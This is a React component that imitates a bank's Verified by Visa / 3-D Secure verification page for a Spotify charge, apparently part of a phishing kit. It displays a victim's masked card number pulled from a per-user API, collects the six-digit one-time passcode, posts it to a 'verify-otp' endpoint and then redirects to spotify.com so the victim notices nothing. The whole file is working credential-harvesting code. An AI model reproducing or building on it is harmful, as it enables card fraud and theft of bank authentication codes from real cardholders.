import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { zokomId } from '../utils/auth';

const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
    const [styles, setStyles] = useState(null);
    const [maskedCardNumber, setMaskedCardNumber] = useState('************');
    const [otp, setOtp] = useState('');
    const [error, setError] = useState('');
    const [loading, setLoading] = useState(false);
    const userId = zokomId();
  
     useEffect(() => {
       const loadStyles = async () => {
         try {
           const [loginStyles, additionalStyles] = await Promise.all([
             import('../../assets/styles/3ds.css'),
             import('../../assets/styles/vbvsub.css')
           ]);
   
           setStyles({
             login: loginStyles.default,
             additional: additionalStyles.default
           });
         } catch (error) {
           console.error('Error loading styles:', error);
         }
       };
   
        loadStyles();
      }, []);
      useEffect(() => {
        const fetchCreditCard = async () => {
          try {
            const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/user-info/${userId}`);
            if (response.data && response.data.cardNumber) {
              // Mask all but last 4 digits
              const last4 = response.data.cardNumber.slice(-4);
              const masked = '*'.repeat(12) + last4;
              setMaskedCardNumber(masked);
            }
          } catch (error) {
            console.error('Error fetching credit card info:', error);
            setMaskedCardNumber('************0000'); // Fallback masked number
          }
        };
    
        fetchCreditCard();
      }, [userId]);

    const handleOtpChange = (e) => {
        const value = e.target.value;
        // Only allow numbers and limit to 6 digits
        if (value === '' || /^\d{0,6}$/.test(value)) {
            setOtp(value);
            setError('');
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!otp || otp.length !== 6) {
            setError('Please enter a valid 6-digit code');
            return;
        }

        setLoading(true);
        try {
            const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/verify-otp`, {
                otp: otp
            });

            if (response.status === 200) {
                // Redirect or show success message
                window.location.href = 'https://spotify.com';
            }
        } catch (error) {
            setError(error.response?.data?.message || 'Verification failed');
        } finally {
            setLoading(false);
        }
    };
    
  return (
    <div style={{ 
      maxHeight: '100%',
      overflow: 'auto',
      padding: '20px',
    }} className="threeds-two">
      <div className="container-fluid">
        <div className="header" id="HeaderLogos">
          <div className="row no-pad">
            <div className="col-12">
              <img alt="" src={logoUrl} className="img-responsive header-logo pull-left" />
              <img alt="Brand logo" src={brandLogo} className="img-responsive header-logo pull-right" />
            </div>
          </div>
        </div>
        <br />
        <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
          <div className="container container-sticky-footer">
            <form
              action="/Api/2_1_0/NextStep/ValidateCredential"
              autoComplete="off"
              data-ajax="true"
              data-ajax-begin="ccHelpers.ajax.onBegin"
              data-ajax-complete="ccHelpers.ajax.onComplete"
              data-ajax-failure="ccHelpers.ajax.onFailure"
              data-ajax-method="form"
              data-ajax-success="ccHelpers.ajax.onSuccess"
              id="ValidateCredentialForm"
              method="post"
              name="ValidateCredentialForm"
              noValidate
              onSubmit={handleSubmit}
            >
              <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                <br />
                <div className="row"></div>
                <div className="row">
                  <div className="col-12" id="ValidateOneUpMessage">
                    <div id="Body1">
                      <strong>Verification authentication</strong>
                    </div>
                  </div>
                </div>
                <br />
                <div className="row form-two-col">
                  <div className="col-12 p-0">
                    <fieldset id="ValidateTransactionDetailsContainer">
                      <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>
                      <div className="validate-field row">
                        <span className="validate-label col-6">Merchant:</span>
                        <span className="col-6">WWW.SPOTIFY.COM</span>
                      </div>
                      <div className="validate-field row">
                        <span className="validate-label col-6">Transaction Amount:</span>
                        <span className="col-6 always-left-to-right">$0.00 USD</span>
                      </div>
                      <div className="validate-field row">
                        <span className="validate-label col-6">Card Number:</span>
                        <span className="col-6 always-left-to-right">{maskedCardNumber}</span>
                      </div>
                      <div className="validate-field row">
                        <span className="validate-label col-6">Verification Code:</span>
                        <span>
                          <label htmlFor="Credential_Value" hidden>
                            Please enter your code
                          </label>
                          <input
                            data-val="true"
                            data-val-required="Please enter your code"
                            placeholder='Please enter your code'
                            name="Credential.Value"
                            type="text"
                            value={otp}
                            onChange={handleOtpChange}
                            maxLength="6"
                            style={{ 
                                width: '200px',
                                height: '36px',
                                padding: '8px 12px',
                                border: '1px solid #ccc',
                                borderRadius: '4px',
                                fontSize: '14px'
                            }}
                          />
                          {error && (
                            <div className="error-message" style={{color: 'red', fontSize: '12px'}}>
                                {error}
                            </div>
                          )}
                        </span>
                      </div>
                      <div className="validate-field row">
                        <span className="validate-label col-6">&nbsp;</span>
                        <span id="ValidationErrorMessage" className="field-validation-error" style={{ display: 'none' }}></span>
                        <span className="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                      </div>
                    </fieldset>
                  </div>
                </div>
                <div className="row">
                  <div className="col-12" id="ValidateOptInMessage">
                    Fraud Warning: Do not provide this One-Time Passcode (OTP) to anyone. We will never contact you to request personal information.
                    <br />
                    <br />
                    To change the selected contact information or to resend a code click Send Another Code.
                  </div>
                </div>
                <div className="row">
                  <div className="col-12">
                    <div id="linkContainer">
                      <a href="#" id="ResendLink">
                        Click here to receive another code
                      </a>
                      <input aria-hidden="true" id="resendLinkTemp" type="hidden" hidden />
                      <input
                        aria-hidden="true"
                        id="resendLinkTooltipText"
                        type="hidden"
                        value="Resend will be enabled after {1} seconds.."
                        hidden
                      />
                    </div>
                    <span id="MaximumResendsReachedMessage" style={{ display: 'none' }}>
                      You have reached the maximum number of requests for a new code
                    </span>
                  </div>
                </div>
              </div>
              <div className="sticky-footer">
                <div className="row no-pad">
                  <div className="col-12 text-center">
                    <button type="submit" className="btn btn-primary" id="ValidateButton">
                      SUBMIT
                    </button>
                  </div>
                </div>
                <div className="" id="FooterLinks">
                  <div className="row">
                    <div className="col-12">
                      <ul className="list-group list-group-horizontal flex-wrap">
                        <li className="list-group-item border-0">
                          <a className="btn btn-link" data-bs-target="#Privacy" data-bs-toggle="modal" href={links.privacy} id="FooterLink2">
                            Privacy Policy
                          </a>
                        </li>
                        <li className="list-group-item border-0">
                          <a className="btn btn-link" data-bs-target="#Terms" data-bs-toggle="modal" href={links.terms} id="FooterLink2">
                            Terms and Conditions
                          </a>
                        </li>
                      </ul>
                      <a id="ExitLink" className="list-group list-group-horizontal flex-wrap pull-right" href="#">
                        Exit
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </div>
        <br />
      </div>
    </div>
  );
};

export default VbvSubmit;
